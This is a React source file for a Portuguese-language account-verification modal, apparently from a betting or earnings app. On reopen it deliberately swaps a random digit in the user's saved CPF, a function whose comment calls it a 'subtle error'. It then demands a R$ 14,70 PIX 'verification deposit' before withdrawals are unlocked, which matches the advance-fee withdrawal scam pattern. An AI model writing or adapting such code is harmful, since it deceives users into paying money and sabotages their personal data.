import React, { useState, useEffect } from 'react';
import { X, CheckCircle, AlertCircle, Shield, User, CreditCard, ChevronRight } from 'lucide-react';
import { KYCStatus } from '../types';

interface KYCVerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  kycStatus: KYCStatus;
  onUpdateKYC: (status: KYCStatus) => void;
  onVerifyAccount: () => void;
}

export const KYCVerificationModal: React.FC<KYCVerificationModalProps> = ({
  isOpen,
  onClose,
  kycStatus,
  onUpdateKYC,
  onVerifyAccount
}) => {
  const [currentStep, setCurrentStep] = useState<1 | 2>(1);
  const [formData, setFormData] = useState({
    cpf: kycStatus.cpf || '',
    fullName: kycStatus.fullName || '',
    birthDate: kycStatus.birthDate || ''
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  useEffect(() => {
    if (isOpen) {
      if (kycStatus.identityVerified && !kycStatus.depositVerified) {
        setCurrentStep(2);
      } else if (!kycStatus.identityVerified) {
        setCurrentStep(1);
      }

      // Pré-carregar dados anteriores
      if (kycStatus.cpf && kycStatus.fullName && kycStatus.birthDate) {
        // Inserir erro sutil no CPF (trocar um digito aleatório)
        const cpfWithError = introduceCPFError(kycStatus.cpf);
        setFormData({
          cpf: cpfWithError,
          fullName: kycStatus.fullName,
          birthDate: kycStatus.birthDate
        });
      } else {
        setFormData({
          cpf: kycStatus.cpf || '',
          fullName: kycStatus.fullName || '',
          birthDate: kycStatus.birthDate || ''
        });
      }
    }
  }, [isOpen, kycStatus]);

  // Funcao para introduzir erro sutil no CPF
  const introduceCPFError = (cpf: string): string => {
    if (!cpf || cpf.length < 11) return cpf;

    const cleaned = cpf.replace(/\D/g, '');
    if (cleaned.length !== 11) return cpf;

    // Escolher posição aleatória (evitar os dois ultimos digitos verificadores)
    const positions = [0, 1, 2, 3, 4, 5, 6, 7, 8];
    const randomPos = positions[Math.floor(Math.random() * positions.length)];

    // Trocar digito por outro diferente
    const chars = cleaned.split('');
    const currentDigit = parseInt(chars[randomPos]);
    const newDigit = (currentDigit + Math.floor(Math.random() * 8) + 1) % 10;
    chars[randomPos] = newDigit.toString();

    const errorCPF = chars.join('');
    return formatCPF(errorCPF);
  };

  if (!isOpen) return null;

  const progress = kycStatus.identityVerified && kycStatus.depositVerified ? 100 :
                   kycStatus.identityVerified ? 50 : 0;

  const validateCPF = (cpf: string): boolean => {
    const cleaned = cpf.replace(/\D/g, '');
    return cleaned.length === 11;
  };

  const formatCPF = (value: string): string => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length <= 3) return cleaned;
    if (cleaned.length <= 6) return `${cleaned.slice(0, 3)}.${cleaned.slice(3)}`;
    if (cleaned.length <= 9) return `${cleaned.slice(0, 3)}.${cleaned.slice(3, 6)}.${cleaned.slice(6)}`;
    return `${cleaned.slice(0, 3)}.${cleaned.slice(3, 6)}.${cleaned.slice(6, 9)}-${cleaned.slice(9, 11)}`;
  };

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCPF(e.target.value);
    setFormData({ ...formData, cpf: formatted });
    if (errors.cpf) setErrors({ ...errors, cpf: '' });
  };

  const handleInputChange = (field: string, value: string) => {
    setFormData({ ...formData, [field]: value });
    if (errors[field]) setErrors({ ...errors, [field]: '' });
  };

  const validateStep1 = (): boolean => {
    const newErrors: Record<string, string> = {};

    if (!formData.cpf || !validateCPF(formData.cpf)) {
      newErrors.cpf = 'CPF invalido';
    }

    if (!formData.fullName || formData.fullName.trim().length < 3) {
      newErrors.fullName = 'Nome completo e obrigatorio';
    }

    if (!formData.birthDate) {
      newErrors.birthDate = 'Data de nascimento e obrigatoria';
    } else {
      const dateRegex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
      const match = formData.birthDate.match(dateRegex);

      if (!match) {
        newErrors.birthDate = 'Data invalida (DD/MM/AAAA)';
      } else {
        const day = parseInt(match[1]);
        const month = parseInt(match[2]);
        const year = parseInt(match[3]);
        const currentYear = new Date().getFullYear();

        if (day < 1 || day > 31 || month < 1 || month > 12 || year < 1900 || year > currentYear) {
          newErrors.birthDate = 'Data invalida';
        } else if (currentYear - year < 18) {
          newErrors.birthDate = 'Voce deve ter 18 anos ou mais';
        }
      }
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleStep1Complete = () => {
    if (validateStep1()) {
      const updatedKYC: KYCStatus = {
        ...kycStatus,
        identityVerified: true,
        cpf: formData.cpf,
        fullName: formData.fullName,
        birthDate: formData.birthDate,
        depositAttempts: kycStatus.depositAttempts || 0
      };
      onUpdateKYC(updatedKYC);
      setCurrentStep(2);
    }
  };


  return (
    <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4 z-[60] overflow-y-auto">
      <div className="bg-gray-900 rounded-2xl shadow-2xl w-full max-w-sm border border-gray-800 my-4 max-h-[90vh] overflow-y-auto">
        <div className="bg-accent p-4 relative overflow-hidden sticky top-0 z-10 rounded-t-2xl">
          <button
            onClick={onClose}
            className="absolute top-3 right-3 text-white/80 hover:text-white transition-colors z-10 w-8 h-8 flex items-center justify-center"
          >
            <X className="w-5 h-5" />
          </button>

          <div className="relative z-10 text-center pt-2 pb-1">
            <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-2">
              <Shield className="w-6 h-6 text-white" />
            </div>
            <h2 className="text-xl font-bold text-white mb-1">Verificacao de Conta</h2>
            <p className="text-white/80 text-xs">Necessario para saques</p>
          </div>
        </div>

        <div className="p-4">
          <div className="bg-gray-800/50 rounded-xl p-3 mb-4">
            <div className="flex items-center justify-between mb-2">
              <span className="text-white text-xs font-semibold">Progresso</span>
              <span className="text-accent text-xs font-bold">{progress}%</span>
            </div>
            <div className="w-full bg-gray-700 rounded-full h-1.5 overflow-hidden">
              <div
                className="bg-accent h-full transition-all duration-500 rounded-full"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>

          <div className="space-y-2 mb-4">
            <div className={`flex items-center gap-2 p-2.5 rounded-lg border transition-all ${
              currentStep === 1 ? 'bg-accent/10 border-accent' :
              kycStatus.identityVerified ? 'bg-green-500/10 border-green-500' :
              'bg-gray-800 border-gray-700'
            }`}>
              <div className={`w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 ${
                kycStatus.identityVerified ? 'bg-green-500' :
                currentStep === 1 ? 'bg-accent' : 'bg-gray-700'
              }`}>
                {kycStatus.identityVerified ? (
                  <CheckCircle className="w-4 h-4 text-white" />
                ) : (
                  <User className="w-4 h-4 text-white" />
                )}
              </div>
              <div className="flex-1 min-w-0">
                <h3 className="text-white font-semibold text-xs">Etapa 1</h3>
                <p className="text-gray-400 text-[10px] leading-tight">
                  {kycStatus.identityVerified ? 'Verificado' : 'Dados pessoais'}
                </p>
              </div>
              {currentStep === 1 && !kycStatus.identityVerified && (
                <ChevronRight className="w-4 h-4 text-accent flex-shrink-0" />
              )}
            </div>

            <div className={`flex items-center gap-2 p-2.5 rounded-lg border transition-all ${
              currentStep === 2 ? 'bg-accent/10 border-accent' :
              kycStatus.depositVerified ? 'bg-green-500/10 border-green-500' :
              'bg-gray-800 border-gray-700'
            }`}>
              <div className={`w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 ${
                kycStatus.depositVerified ? 'bg-green-500' :
                currentStep === 2 ? 'bg-accent' : 'bg-gray-700'
              }`}>
                {kycStatus.depositVerified ? (
                  <CheckCircle className="w-4 h-4 text-white" />
                ) : (
                  <CreditCard className="w-4 h-4 text-white" />
                )}
              </div>
              <div className="flex-1 min-w-0">
                <h3 className="text-white font-semibold text-xs">Etapa 2</h3>
                <p className="text-gray-400 text-[10px] leading-tight">
                  {kycStatus.depositVerified ? 'Verificado' : 'Deposito de verificacao'}
                </p>
              </div>
              {currentStep === 2 && !kycStatus.depositVerified && (
                <ChevronRight className="w-4 h-4 text-accent flex-shrink-0" />
              )}
            </div>
          </div>

          {currentStep === 1 && !kycStatus.identityVerified && (
            <div className="space-y-3">

              <div>
                <label className="block text-white font-semibold mb-1.5 text-xs">CPF</label>
                <input
                  type="text"
                  value={formData.cpf}
                  onChange={handleCPFChange}
                  maxLength={14}
                  placeholder="000.000.000-00"
                  className={`w-full bg-gray-800 border ${errors.cpf ? 'border-red-500' : 'border-gray-700'} text-white px-3 py-2.5 rounded-lg text-sm focus:outline-none focus:border-accent transition-colors`}
                />
                {errors.cpf && (
                  <p className="text-red-400 text-[10px] mt-1">{errors.cpf}</p>
                )}
              </div>

              <div>
                <label className="block text-white font-semibold mb-1.5 text-xs">Nome Completo</label>
                <input
                  type="text"
                  value={formData.fullName}
                  onChange={(e) => handleInputChange('fullName', e.target.value)}
                  placeholder="Seu nome completo"
                  className={`w-full bg-gray-800 border ${errors.fullName ? 'border-red-500' : 'border-gray-700'} text-white px-3 py-2.5 rounded-lg text-sm focus:outline-none focus:border-accent transition-colors`}
                />
                {errors.fullName && (
                  <p className="text-red-400 text-[10px] mt-1">{errors.fullName}</p>
                )}
              </div>

              <div>
                <label className="block text-white font-semibold mb-1.5 text-xs">Data de Nascimento</label>
                <input
                  type="text"
                  value={formData.birthDate}
                  onChange={(e) => {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length >= 2) {
                      value = value.slice(0, 2) + '/' + value.slice(2);
                    }
                    if (value.length >= 5) {
                      value = value.slice(0, 5) + '/' + value.slice(5, 9);
                    }
                    handleInputChange('birthDate', value);
                  }}
                  maxLength={10}
                  placeholder="DD/MM/AAAA"
                  className={`w-full bg-gray-800 border ${errors.birthDate ? 'border-red-500' : 'border-gray-700'} text-white px-3 py-2.5 rounded-lg text-sm focus:outline-none focus:border-accent transition-colors`}
                />
                {errors.birthDate && (
                  <p className="text-red-400 text-[10px] mt-1">{errors.birthDate}</p>
                )}
              </div>

              <button
                onClick={handleStep1Complete}
                className="w-full bg-accent text-white font-bold py-3 rounded-lg hover:bg-accent-hover transition-all duration-300 active:scale-95 text-sm mt-1"
                style={{ touchAction: 'manipulation' }}
              >
                Continuar
              </button>
            </div>
          )}

          {currentStep === 2 && kycStatus.identityVerified && !kycStatus.depositVerified && (
            <div className="space-y-3">
              <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
                <div className="w-12 h-12 bg-accent/20 rounded-full flex items-center justify-center mx-auto mb-2">
                  <Shield className="w-6 h-6 text-accent" />
                </div>
                <h3 className="text-white font-bold text-base mb-2 text-center">Verificacao de Titularidade</h3>
                <p className="text-gray-300 text-xs mb-3 text-center leading-relaxed">
                  Faca um deposito minimo para confirmar que voce e o titular da conta PIX
                </p>

                <div className="bg-accent/10 rounded-lg p-3 mb-3 border border-accent/30">
                  <div className="text-accent text-2xl font-bold mb-1 text-center">R$ 14,70</div>
                  <p className="text-gray-400 text-[10px] text-center">Deposito de verificacao</p>
                </div>

                <div className="bg-green-500/10 border border-green-500/30 rounded-lg p-2.5 mb-3">
                  <div className="flex items-start gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400 mt-0.5 flex-shrink-0" />
                    <div>
                      <h4 className="text-green-300 font-bold text-xs mb-1">O valor sera creditado</h4>
                      <p className="text-green-200 text-[10px] leading-relaxed">
                        Os R$ 14,70 serao adicionados ao seu saldo apos a verificacao
                      </p>
                    </div>
                  </div>
                </div>

                <button
                  onClick={onVerifyAccount}
                  className="w-full bg-accent text-white font-bold py-3 rounded-lg hover:bg-accent-hover transition-all duration-300 active:scale-95 text-sm"
                  style={{ touchAction: 'manipulation' }}
                >
                  Fazer Deposito de Verificacao
                </button>
              </div>

              <div className="bg-blue-500/10 rounded-lg p-2.5 border border-blue-500/30">
                <div className="flex items-start gap-2">
                  <Shield className="w-3.5 h-3.5 text-blue-400 mt-0.5 flex-shrink-0" />
                  <div>
                    <p className="text-blue-200 text-[10px] leading-relaxed">
                      Apos verificacao, voce podera sacar todo o seu saldo disponivel
                    </p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {kycStatus.isVerified && (
            <div className="bg-green-500/10 border border-green-500/30 rounded-lg p-4 text-center">
              <div className="w-14 h-14 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-3">
                <CheckCircle className="w-7 h-7 text-white" />
              </div>
              <h3 className="text-white font-bold text-base mb-2">Conta Verificada!</h3>
              <p className="text-gray-400 text-xs mb-3">
                Saques liberados com sucesso
              </p>
              <button
                onClick={onClose}
                className="w-full bg-accent text-white font-bold py-3 rounded-lg hover:bg-accent-hover transition-all duration-300 active:scale-95 text-sm"
                style={{ touchAction: 'manipulation' }}
              >
                Fechar
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
